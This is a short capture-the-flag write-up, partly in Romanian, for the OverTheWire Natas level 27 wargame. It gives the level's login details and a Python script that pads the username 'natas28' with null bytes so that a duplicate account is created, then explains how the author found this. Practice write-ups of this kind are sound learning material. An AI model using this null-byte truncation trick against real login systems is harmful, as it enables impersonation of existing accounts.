
# General info

Username: natas27
Password: u3RRffXjysjgwFU6b9xa23i6prmUsYne
URL:      http://natas27.natas.labs.overthewire.org

# Special code section

```py
import requests

response = requests.get(
    url="http://natas27.natas.labs.overthewire.org/index.php",
    auth=("natas27", "u3RRffXjysjgwFU6b9xa23i6prmUsYne"),
    params={
        "username" : "natas28" + "\x00" * 64 + "x",
        "password" : "b"
    }
)

print(response.text)
```

Asta a fost un nivel mai abstract.
Am incercat sa inteleg daca exista vreo vulnerabilitate de SQL injection pentru `mysqli_real_escape_string`, dar tot ce am gasit a fost pentru varianta veche `mysql_*`, care avea un bug cand foloseai un charset precum `gbk`.

Dupa, am trecut la a citi niste writeups ca sa inteleg unde gresesc.
Am gasit o posibila solutie care indica o problema mare: baza de date permitea valori duplicate.
De aici, am inteles ca trebuie sa existe o metoda de a crea doi utilizatori `natas28` cu parole diferite.

Prima data am incercat sa folosesc whitespaces pentru username, dar nu a functionat.
Dupa m-am gandit la null bytes care au functionat.